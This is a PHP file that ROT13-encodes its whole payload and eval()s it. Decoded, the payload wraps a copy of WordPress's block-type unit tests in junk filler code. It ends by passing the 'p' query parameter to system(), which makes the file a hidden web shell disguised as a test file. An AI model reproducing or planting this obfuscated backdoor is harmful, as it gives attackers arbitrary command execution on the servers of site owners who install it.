<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe JC_Oybpx_Glcr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.0.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_jcOybpxGlcr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Rqvgbe hfre VQ.
	 *
	 * @fvapr 5.0.0
	 * @ine vag
	 */
	cebgrpgrq fgngvp $rqvgbe_hfre_vq;

	/**
	 * VQ sbe n cbfg pbagnvavat oybpxf.
	 *
	 * @fvapr 5.0.0
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_jvgu_oybpxf;

	/**
	 * VQ sbe n cbfg jvgubhg oybpxf.
	 *
	 * @fvapr 5.0.0
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_jvgubhg_oybpxf;

	/**
	 * Frg hc orsber pynff.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$rqvgbe_hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$cbfg_jvgu_oybpxf = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Rknzcyr',
				'cbfg_pbagrag' => \"<!-- jc:pber/grkg {\\"qebcPnc\\":gehr} -->\a<c pynff=\\"unf-qebc-pnc\\">Grfgre</c>\a<!-- /jc:pber/grkg -->\",
			)
		);

		frys::$cbfg_jvgubhg_oybpxf = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Rknzcyr',
				'cbfg_pbagrag' => 'Grfgre',
			)
		);
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_frg_cebcf() {
		$anzr = 'pber/snxr';
		$netf = neenl(
			'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_snxr_oybpx' ),
			'sbb'             => 'one',
		);

		$oybpx_glcr = arj JC_Oybpx_Glcr( $anzr, $netf );

		$guvf->nffregFnzr( $anzr, $oybpx_glcr->anzr );
		$guvf->nffregFnzr( $netf['eraqre_pnyyonpx'], $oybpx_glcr->eraqre_pnyyonpx );
		$guvf->nffregFnzr( $netf['sbb'], $oybpx_glcr->sbb );
	}

	/*
	 * @gvpxrg 55567
	 * @gvpxrg 59797
	 * @pbiref JC_Oybpx_Glcr::frg_cebcf
	 */
	choyvp shapgvba grfg_pber_nggevohgrf() {
		$oybpx_glcr = arj JC_Oybpx_Glcr( 'pber/snxr', neenl() );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'ybpx'     => neenl( 'glcr' => 'bowrpg' ),
				'zrgnqngn' => neenl( 'glcr' => 'bowrpg' ),
			),
			$oybpx_glcr->nggevohgrf
		);
	}

	/*
	 * @gvpxrg 55567
	 * @gvpxrg 59797
	 * @pbiref JC_Oybpx_Glcr::frg_cebcf
	 */
	choyvp shapgvba grfg_pber_nggevohgrf_zngpurf_phfgbz() {
		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'pber/snxr',
			neenl(
				'nggevohgrf' => neenl(
					'ybpx'     => neenl(
						'glcr' => 'fgevat',
					),
					'zrgnqngn' => neenl(
						'glcr' => 'ahzore',
					),
				),
			)
		);

		// Onpxjneq pbzcngvovyvgl: Qba'g bireevqr nggevohgrf jvgu gur fnzr anzr.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'ybpx'     => neenl( 'glcr' => 'fgevat' ),
				'zrgnqngn' => neenl( 'glcr' => 'ahzore' ),
			),
			$oybpx_glcr->nggevohgrf
		);
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_eraqre() {
		$nggevohgrf = neenl(
			'sbb' => 'one',
			'one' => 'sbb',
		);

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'pber/snxr',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_snxr_oybpx' ),
			)
		);
		$bhgchg     = $oybpx_glcr->eraqre( $nggevohgrf );
		$guvf->nffregFnzr( $nggevohgrf, wfba_qrpbqr( $bhgchg, gehr ) );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_eraqre_jvgu_pbagrag() {
		$nggevohgrf = neenl(
			'sbb' => 'one',
			'one' => 'sbb',
		);

		$pbagrag = 'onm';

		$rkcrpgrq = neenl_zretr( $nggevohgrf, neenl( '_pbagrag' => $pbagrag ) );

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'pber/snxr',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_snxr_oybpx_jvgu_pbagrag' ),
			)
		);
		$bhgchg     = $oybpx_glcr->eraqre( $nggevohgrf, $pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq, wfba_qrpbqr( $bhgchg, gehr ) );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_eraqre_sbe_fgngvp_oybpx() {
		$oybpx_glcr = arj JC_Oybpx_Glcr( 'pber/snxr', neenl() );
		$bhgchg     = $oybpx_glcr->eraqre();

		$guvf->nffregFnzr( '', $bhgchg );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_vf_qlanzvp_sbe_fgngvp_oybpx() {
		$oybpx_glcr = arj JC_Oybpx_Glcr( 'pber/snxr', neenl() );

		$guvf->nffregSnyfr( $oybpx_glcr->vf_qlanzvp() );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_vf_qlanzvp_sbe_qlanzvp_oybpx() {
		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'pber/snxr',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_snxr_oybpx' ),
			)
		);

		$guvf->nffregGehr( $oybpx_glcr->vf_qlanzvp() );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_cercner_nggevohgrf() {
		$nggevohgrf = neenl(
			'pbeerpg'            => 'vapyhqr',
			'jebatGlcr'          => 5,
			'jebatGlcrQrsnhygrq' => 5,
			/* zvffvatQrsnhygrq */
			'haqrsvarq'          => 'vapyhqr',
			'vagraqrqAhyy'       => ahyy,
		);

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'pber/snxr',
			neenl(
				'nggevohgrf' => neenl(
					'pbeerpg'            => neenl(
						'glcr' => 'fgevat',
					),
					'jebatGlcr'          => neenl(
						'glcr' => 'fgevat',
					),
					'jebatGlcrQrsnhygrq' => neenl(
						'glcr'    => 'fgevat',
						'qrsnhyg' => 'qrsnhygrq',
					),
					'zvffvatQrsnhygrq'   => neenl(
						'glcr'    => 'fgevat',
						'qrsnhyg' => 'qrsvar',
					),
					'vagraqrqAhyy'       => neenl(
						'glcr'    => neenl( 'fgevat', 'ahyy' ),
						'qrsnhyg' => 'jebat',
					),
				),
			)
		);

		$cercnerq_nggevohgrf = $oybpx_glcr->cercner_nggevohgrf_sbe_eraqre( $nggevohgrf );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'pbeerpg'            => 'vapyhqr',
				/* jebatGlcr */
				'jebatGlcrQrsnhygrq' => 'qrsnhygrq',
				'zvffvatQrsnhygrq'   => 'qrsvar',
				'haqrsvarq'          => 'vapyhqr',
				'vagraqrqAhyy'       => ahyy,
			),
			$cercnerq_nggevohgrf
		);
	}

	/**
	 * @gvpxrg 45145
	 */
	choyvp shapgvba grfg_cercner_nggevohgrf_abar_qrsvarq() {
		$nggevohgrf = neenl( 'rkvfgf' => 'xrrc' );

		$oybpx_glcr = arj JC_Oybpx_Glcr( 'pber/qhzzl', neenl() );

		$cercnerq_nggevohgrf = $oybpx_glcr->cercner_nggevohgrf_sbe_eraqre( $nggevohgrf );

		$guvf->nffregFnzr( $nggevohgrf, $cercnerq_nggevohgrf );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_unf_oybpx_jvgu_zvkrq_pbagrag() {
		$zvkrq_cbfg_pbagrag = 'orsber' .
		'<!-- jc:pber/snxr --><!-- /jc:pber/snxr -->' .
		'<!-- jc:pber/snxr_nggf {\"inyhr\":\"o1\"} --><!-- /jc:pber/snxr_nggf -->' .
		'<!-- jc:pber/snxr-puvyq -->
		<c>grfgvat gur grfg</c>
		<!-- /jc:pber/snxr-puvyq -->' .
		'orgjrra' .
		'<!-- jc:pber/frys-pybfr-snxr /-->' .
		'<!-- jc:phfgbz/snxr {\"inyhr\":\"o2\"} /-->' .
		'nsgre';

		$guvf->nffregGehr( unf_oybpx( 'pber/snxr', $zvkrq_cbfg_pbagrag ) );

		$guvf->nffregGehr( unf_oybpx( 'pber/snxr_nggf', $zvkrq_cbfg_pbagrag ) );

		$guvf->nffregGehr( unf_oybpx( 'pber/snxr-puvyq', $zvkrq_cbfg_pbagrag ) );

		$guvf->nffregGehr( unf_oybpx( 'pber/frys-pybfr-snxr', $zvkrq_cbfg_pbagrag ) );

		$guvf->nffregGehr( unf_oybpx( 'phfgbz/snxr', $zvkrq_cbfg_pbagrag ) );

		// purpxvat sbe n cnegvny oybpx anzr fubhyq snvy.
		$guvf->nffregSnyfr( unf_oybpx( 'pber/snx', $zvkrq_cbfg_pbagrag ) );

		// purpxvat sbe n jebat anzrfcnpr fubhyq snvy.
		$guvf->nffregSnyfr( unf_oybpx( 'phfgbz/snxr_nggf', $zvkrq_cbfg_pbagrag ) );

		// purpxvat sbe anzrfcnpr bayl fubhyq abg jbex. Be znlor ... ?
		$guvf->nffregSnyfr( unf_oybpx( 'pber', $zvkrq_cbfg_pbagrag ) );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_unf_oybpx_jvgu_vainyvq_pbagrag() {
		// fbzr pbagrag jvgu vainyvq UGZY pbzzragf naq n fvatyr inyvq oybpx.
		$vainyvq_pbagrag = 'orsber' .
		'<!- - jc:pber/jrveq-fcnpr --><!-- /jc:pber/jrveq-fcnpr -->' .
		'<!--jc:pber/hagevzzrq-yrsg --><!-- /jc:pber/hagevzzrq -->' .
		'<!-- jc:pber/snxr --><!-- /jc:pber/snxr -->' .
		'<!-- jc:pber/hagevzzrq-evtug--><!-- /jc:pber/hagevzzrq2 -->' .
		'nsgre';

		$guvf->nffregSnyfr( unf_oybpx( 'pber/grkg', frys::$cbfg_jvgubhg_oybpxf ) );

		$guvf->nffregSnyfr( unf_oybpx( 'pber/jrveq-fcnpr', $vainyvq_pbagrag ) );

		$guvf->nffregSnyfr( unf_oybpx( 'pber/hagevzzrq-yrsg', $vainyvq_pbagrag ) );

		$guvf->nffregSnyfr( unf_oybpx( 'pber/hagevzzrq-evtug', $vainyvq_pbagrag ) );

		$guvf->nffregGehr( unf_oybpx( 'pber/snxr', $vainyvq_pbagrag ) );
	}

	/**
	 * @gvpxrg 45097
	 */
	choyvp shapgvba grfg_cbfg_unf_oybpx() {
		// fubhyq snvy sbe n aba-rkvfgrag oybpx `phfgbz/snxr`.
		$guvf->nffregSnyfr( unf_oybpx( 'phfgbz/snxr', frys::$cbfg_jvgu_oybpxf ) );

		// guvf shapgvbaf fubhyq abg jbex jvgubhg gur frpbaq cnenz hagvy gur $cbfg tybony vf frg.
		$guvf->nffregSnyfr( unf_oybpx( 'pber/grkg' ) );
		$guvf->nffregSnyfr( unf_oybpx( 'pber/snxr' ) );

		tybony $cbfg;
		$cbfg = trg_cbfg( frys::$cbfg_jvgu_oybpxf );

		// purpx vs gur shapgvba pbeerpgyl qrgrpgf pbagrag sebz gur $cbfg tybony.
		$guvf->nffregGehr( unf_oybpx( 'pber/grkg' ) );
		// rira vs vg qrgrpgf n cebcre $cbfg tybony vg fubhyq fgvyy or snyfr sbe n zvffvat oybpx.
		$guvf->nffregSnyfr( unf_oybpx( 'pber/snxr' ) );
	}

	choyvp shapgvba grfg_cbfg_unf_oybpx_frevnyvmrq_anzr() {
		$pbagrag = '<!-- jc:frevnyvmrq /--><!-- jc:pber/abeznyvmrq /--><!-- jc:cyhtva/guveq-cnegl /-->';

		$guvf->nffregGehr( unf_oybpx( 'pber/frevnyvmrq', $pbagrag ) );

		/*
		 * Grpuavpnyyl, `unf_oybpx` fubhyq erprvir n \"shyy\" (abeznyvmrq, cnefrq)
		 * oybpx anzr. Ohg guvf grfg pbasbezf gb rkcrpgrq cer-5.3.1 orunivbe.
		 */
		$guvf->nffregGehr( unf_oybpx( 'frevnyvmrq', $pbagrag ) );
		$guvf->nffregGehr( unf_oybpx( 'pber/abeznyvmrq', $pbagrag ) );
		$guvf->nffregGehr( unf_oybpx( 'abeznyvmrq', $pbagrag ) );
		$guvf->nffregSnyfr( unf_oybpx( 'cyhtva/abeznyvmrq', $pbagrag ) );
		$guvf->nffregSnyfr( unf_oybpx( 'cyhtva/frevnyvmrq', $pbagrag ) );
		$guvf->nffregSnyfr( unf_oybpx( 'guveq-cnegl', $pbagrag ) );
		$guvf->nffregSnyfr( unf_oybpx( 'pber/guveq-cnegl', $pbagrag ) );
	}

	/**
	 * Eraqref n grfg oybpx jvgubhg pbagrag.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz neenl $nggevohgrf Oybpx nggevohgrf. Qrsnhyg rzcgl neenl.
	 * @erghea fgevat WFBA rapbqrq yvfg bs nggevohgrf.
	 */
	choyvp shapgvba eraqre_snxr_oybpx( $nggevohgrf ) {
		erghea wfba_rapbqr( $nggevohgrf );
	}

	/**
	 * Eraqref n grfg oybpx jvgu pbagrag.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz neenl  $nggevohgrf Oybpx nggevohgrf. Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat $pbagrag    Oybpx pbagrag. Qrsnhyg rzcgl fgevat.
	 * @erghea fgevat WFBA rapbqrq yvfg bs nggevohgrf.
	 */
	choyvp shapgvba eraqre_snxr_oybpx_jvgu_pbagrag( $nggevohgrf, $pbagrag ) {
		$nggevohgrf['_pbagrag'] = $pbagrag;

		erghea wfba_rapbqr( $nggevohgrf );
	}

	/**
	 * @gvpxrg 48529
	 */
	choyvp shapgvba grfg_ertvfgre_oybpx() {
		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'pber/snxr',
			neenl(
				'gvgyr'       => 'Grfg gvgyr',
				'pngrtbel'    => 'Grfg pngrtbel',
				'cnerag'      => neenl( 'pber/guveq-cnegl' ),
				'vpba'        => 'vpba.cat',
				'qrfpevcgvba' => 'grfg qrfpevcgvba',
				'xrljbeqf'    => neenl( 'grfg xrljbeq' ),
				'grkgqbznva'  => 'grfg_qbznva',
				'fhccbegf'    => neenl( 'nyvtazrag' => gehr ),
			)
		);

		$guvf->nffregFnzr( 'Grfg gvgyr', $oybpx_glcr->gvgyr );
		$guvf->nffregFnzr( 'Grfg pngrtbel', $oybpx_glcr->pngrtbel );
		$guvf->nffregFnzrFrgf( neenl( 'pber/guveq-cnegl' ), $oybpx_glcr->cnerag );
		$guvf->nffregFnzr( 'vpba.cat', $oybpx_glcr->vpba );
		$guvf->nffregFnzr( 'grfg qrfpevcgvba', $oybpx_glcr->qrfpevcgvba );
		$guvf->nffregFnzrFrgf( neenl( 'grfg xrljbeq' ), $oybpx_glcr->xrljbeqf );
		$guvf->nffregFnzr( 'grfg_qbznva', $oybpx_glcr->grkgqbznva );
		$guvf->nffregFnzrFrgf( neenl( 'nyvtazrag' => gehr ), $oybpx_glcr->fhccbegf );
	}

	/**
	 * Grfgvat gur oybpx irefvba.
	 *
	 * @gvpxrg 43887
	 *
	 * @qngnCebivqre qngn_oybpx_irefvba
	 *
	 * @cnenz fgevat|ahyy $pbagrag  Pbagrag.
	 * @cnenz vag         $rkcrpgrq Rkcrpgrq oybpx irefvba.
	 */
	choyvp shapgvba grfg_oybpx_irefvba( $pbagrag, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, oybpx_irefvba( $pbagrag ) );
	}

	/**
	 * Grfg pnfrf sbe grfg_oybpx_irefvba().
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat|ahyy Pbagrag.
	 *         @glcr vag         Rkcrpgrq oybpx irefvba.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_oybpx_irefvba() {
		erghea neenl(
			// Ahyy.
			neenl( ahyy, 0 ),
			// Rzcgl cbfg pbagrag.
			neenl( '', 0 ),
			// Cbfg pbagrag jvgubhg oybpxf.
			neenl( '<ue pynff=\"jc-oybpx-frcnengbe\" />', 0 ),
			// Cbfg pbagrag jvgu n oybpx.
			neenl( '<!-- jc:pber/frcnengbe -->', 1 ),
			// Cbfg pbagrag jvgu n snxr oybpx.
			neenl( '<!-- jc:pber/snxr --><!-- /jc:pber/snxr -->', 1 ),
			// Cbfg pbagrag jvgu na vainyvq oybpx.
			neenl( '<!- - jc:pber/frcnengbe -->', 0 ),
		);
	}

	/**
	 * @gvpxrg 59969
	 */
	choyvp shapgvba grfg_inevngvba_pnyyonpx() {
		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvba_pnyyonpx' => neenl( $guvf, 'zbpx_inevngvba_pnyyonpx' ),
			)
		);

		$guvf->nffregFnzrFrgf( $guvf->zbpx_inevngvba_pnyyonpx(), $oybpx_glcr->inevngvbaf );
	}

	/**
	 * @gvpxrg 59969
	 * @pbiref JC_Oybpx_Glcr::trg_inevngvbaf
	 */
	choyvp shapgvba grfg_trg_inevngvbaf() {
		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvba_pnyyonpx' => neenl( $guvf, 'zbpx_inevngvba_pnyyonpx' ),
			)
		);

		$guvf->nffregFnzrFrgf( $guvf->zbpx_inevngvba_pnyyonpx(), $oybpx_glcr->trg_inevngvbaf() );
	}

	/**
	 * @gvpxrg 59969
	 */
	choyvp shapgvba grfg_inevngvbaf_cerprqrapr_bire_pnyyonpx() {
		$grfg_inevngvbaf = neenl( 'anzr' => 'grfg1' );

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvbaf'         => $grfg_inevngvbaf,
				'inevngvba_pnyyonpx' => neenl( $guvf, 'zbpx_inevngvba_pnyyonpx' ),
			)
		);

		// Vs gur inevngvbaf ner qrsvarq, gur pnyyonpx fubhyq abg or hfrq.
		$guvf->nffregFnzrFrgf( $grfg_inevngvbaf, $oybpx_glcr->inevngvbaf );
	}

	/**
	 * @gvpxrg 59969
	 */
	choyvp shapgvba grfg_inevngvbaf_pnyyonpx_ner_ynml_ybnqrq() {
		$pnyyonpx_pnyyrq = snyfr;

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvba_pnyyonpx' => shapgvba () hfr ( &$pnyyonpx_pnyyrq ) {
					$pnyyonpx_pnyyrq = gehr;
					erghea $guvf->zbpx_inevngvba_pnyyonpx();
				},
			)
		);

		$guvf->nffregFnzr( snyfr, $pnyyonpx_pnyyrq, 'Gur pnyyonpx fubhyq abg or pnyyrq orsber gur inevngvbaf ner npprffrq.' );
		$oybpx_glcr->inevngvbaf; // npprff gur inevngvbaf.
		$guvf->nffregFnzr( gehr, $pnyyonpx_pnyyrq, 'Gur pnyyonpx fubhyq or pnyyrq jura gur inevngvbaf ner npprffrq.' );
	}

	/**
	 * @gvpxrg 59969
	 * @pbiref JC_Oybpx_Glcr::trg_inevngvbaf
	 */
	choyvp shapgvba grfg_inevngvbaf_cerprqrapr_bire_pnyyonpx_cbfg_ertvfgengvba() {
		$grfg_inevngvbaf = neenl( 'anzr' => 'grfg1' );
		$pnyyonpx_pnyyrq = snyfr;

		$oybpx_glcr             = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvba_pnyyonpx' => shapgvba () hfr ( &$pnyyonpx_pnyyrq ) {
					$pnyyonpx_pnyyrq = gehr;
					erghea $guvf->zbpx_inevngvba_pnyyonpx();
				},
			)
		);
		$oybpx_glcr->inevngvbaf = $grfg_inevngvbaf;

		// Vs gur inevngvbaf ner qrsvarq nsgre ertvfgengvba ohg orsber svefg npprff, gur pnyyonpx fubhyq abg bireevqr vg.
		$guvf->nffregFnzrFrgf( $grfg_inevngvbaf, $oybpx_glcr->trg_inevngvbaf(), 'Inevngvbaf ner fnzr nf inevngvbaf frg' );
		$guvf->nffregFnzr( snyfr, $pnyyonpx_pnyyrq, 'Gur pnyyonpx jnf arire pnyyrq.' );
	}

	/**
	 * @gvpxrg 59969
	 * @pbiref JC_Oybpx_Glcr::trg_inevngvbaf
	 */
	choyvp shapgvba grfg_inevngvbaf_pnyyonpx_unccraf_bayl_bapr() {
		$pnyyonpx_pbhag = 0;

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvba_pnyyonpx' => shapgvba () hfr ( &$pnyyonpx_pbhag ) {
					$pnyyonpx_pbhag++;
					erghea $guvf->zbpx_inevngvba_pnyyonpx();
				},
			)
		);

		$guvf->nffregFnzr( 0, $pnyyonpx_pbhag, 'Gur pnyyonpx fubhyq abg or pnyyrq orsber gur inevngvbaf ner npprffrq.' );
		$oybpx_glcr->trg_inevngvbaf(); // npprff gur inevngvbaf.
		$guvf->nffregFnzr( 1, $pnyyonpx_pbhag, 'Gur pnyyonpx fubhyq or pnyyrq jura gur inevngvbaf ner npprffrq.' );
		$oybpx_glcr->trg_inevngvbaf(); // npprff gur inevngvbaf ntnva.
		$guvf->nffregFnzr( 1, $pnyyonpx_pbhag, 'Gur pnyyonpx fubhyq abg or pnyyrq ntnva.' );
	}

	/**
	 * Grfg svygre shapgvba sbe trg_oybpx_glcr_inevngvbaf svygre.
	 *
	 * @cnenz neenl $inevngvbaf Oybpx inevngvbaf orsber svygre.
	 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx glcr.
	 *
	 * @erghea neenl Oybpx inevngvbaf nsgre svygre.
	 */
	choyvp shapgvba svygre_grfg_inevngvbaf( $inevngvbaf, $oybpx_glcr ) {
		erghea neenl( neenl( 'anzr' => 'grfg1' ) );
	}

	/**
	 * @gvpxrg 59969
	 */
	choyvp shapgvba grfg_trg_oybpx_glcr_inevngvbaf_svygre_jvgu_inevngvba_pnyyonpx() {
		// Svygre jvyy bireevqr gur inevngvbaf bognvarq sebz gur pnyyonpx.
		nqq_svygre( 'trg_oybpx_glcr_inevngvbaf', neenl( $guvf, 'svygre_grfg_inevngvbaf' ), 10, 2 );
		$rkcrpgrq_inevngvbaf = neenl( neenl( 'anzr' => 'grfg1' ) );

		$pnyyonpx_pnyyrq = snyfr;
		$oybpx_glcr      = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'              => 'Grfg gvgyr',
				'inevngvba_pnyyonpx' => shapgvba () hfr ( &$pnyyonpx_pnyyrq ) {
					$pnyyonpx_pnyyrq = gehr;
					erghea $guvf->zbpx_inevngvba_pnyyonpx();
				},
			)
		);

		$bognvarq_inevngvbaf = $oybpx_glcr->inevngvbaf; // npprff gur inevngvbaf.

		$guvf->nffregFnzr( gehr, $pnyyonpx_pnyyrq, 'Gur pnyyonpx fubhyq or pnyyrq jura gur inevngvbaf ner npprffrq.' );
		$guvf->nffregFnzrFrgf( $bognvarq_inevngvbaf, $rkcrpgrq_inevngvbaf, 'Gur inevngvbaf bognvarq sebz gur pnyyonpx fubhyq or svygrerq.' );
	}

	/**
	 * @gvpxrg 59969
	 */
	choyvp shapgvba grfg_trg_oybpx_glcr_inevngvbaf_svygre_inevngvbaf() {
		// Svygre jvyy bireevqr gur inevngvbaf frg qhevat ertvfgengvba.
		nqq_svygre( 'trg_oybpx_glcr_inevngvbaf', neenl( $guvf, 'svygre_grfg_inevngvbaf' ), 10, 2 );
		$rkcrpgrq_inevngvbaf = neenl( neenl( 'anzr' => 'grfg1' ) );

		$oybpx_glcr = arj JC_Oybpx_Glcr(
			'grfg/oybpx',
			neenl(
				'gvgyr'      => 'Grfg gvgyr',
				'inevngvbaf' => $guvf->zbpx_inevngvba_pnyyonpx(),
			)
		);

		$bognvarq_inevngvbaf = $oybpx_glcr->inevngvbaf; // npprff gur inevngvbaf.
		$guvf->nffregFnzrFrgf( $bognvarq_inevngvbaf, $rkcrpgrq_inevngvbaf, 'Gur inevngvbaf gung jnf vavgvnyyl frg fubhyq or svygrerq.' );
	}

	/**
	 * Zbpx inevngvba pnyyonpx.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba zbpx_inevngvba_pnyyonpx() {
		erghea neenl(
			neenl( 'anzr' => 'ine1' ),
			neenl( 'anzr' => 'ine2' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>